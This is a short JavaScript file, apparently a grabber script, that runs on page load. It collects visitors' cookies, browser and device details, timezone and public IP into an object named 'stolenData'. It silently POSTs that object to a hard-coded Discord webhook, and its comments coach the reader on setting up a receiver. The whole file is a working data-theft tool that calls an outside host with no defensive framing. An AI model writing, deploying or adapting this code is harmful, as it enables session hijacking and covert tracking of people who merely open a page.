// This function runs as soon as the page loads
window.onload = function() {
    // 1. COLLECT THE DATA
    const stolenData = {
        ip: "Fetching...", // We'll try to get this, but it's unreliable from JS alone due to CORS
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookie: document.cookie,
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
    };

    // 2. TRY TO GET THE PUBLIC IP (using a third-party service)
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            stolenData.ip = data.ip;
            // Now that we have the IP, send the complete package
            sendData(stolenData);
        })
        .catch(error => {
            console.error('Could not fetch IP:', error);
            // Send what we have even if the IP fetch fails
            sendData(stolenData);
        });
};

// 3. SEND THE DATA TO YOUR RECEIVER
function sendData(data) {
    // IMPORTANT: Replace 'YOUR_WEBHOOK_URL_HERE' with a real URL
    // Get a free disposable URL from a service like webhook.site or bin.scr
    const receiverURL = 'https://discord.com/api/webhooks/1449164820489179380/CuXHdA3kI3DEbumJR_uoBUkYxbyD-JUEN9LBZkvXVoeHS8vxpI8hXfuE7CHXudL4kdP7';

    fetch(receiverURL, {
        method: 'POST',
        mode: 'no-cors', // 'no-cors' prevents the browser from showing errors, but it also means you won't know if it succeeded
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
}
